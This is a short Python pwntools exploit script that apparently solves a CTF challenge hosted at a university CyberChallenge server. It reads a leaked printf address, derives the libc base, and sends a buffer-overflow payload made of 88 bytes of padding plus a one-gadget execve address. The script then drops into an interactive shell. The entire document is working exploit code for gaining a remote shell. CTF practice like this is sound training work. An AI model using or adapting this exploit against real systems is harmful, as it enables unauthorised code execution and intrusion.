from pwn import *


libc = ELF('./libc.so.6')
system = libc.symbols['system']
printf = libc.symbols['printf']

# p = process('./bin')
p = remote('cyberchallenge.disi.unitn.it', 9101)


p.recvuntil(b'is at ')
leaked_printf = int(p.recvuntil(b',')[:-1].strip(), 16)
p.recvuntil(b'?')
print(hex(leaked_printf))

base_addr = system - printf
system_addr = leaked_printf + base_addr

base_addr = leaked_printf - printf
execve = 0x583dc
execve_addr = execve + base_addr

base_addr = 88

sa = f"{system_addr} ".encode()
payload = sa + b'A' * (base_addr - len(sa)) + p64(execve_addr)

p.sendline(payload)
p.interactive()

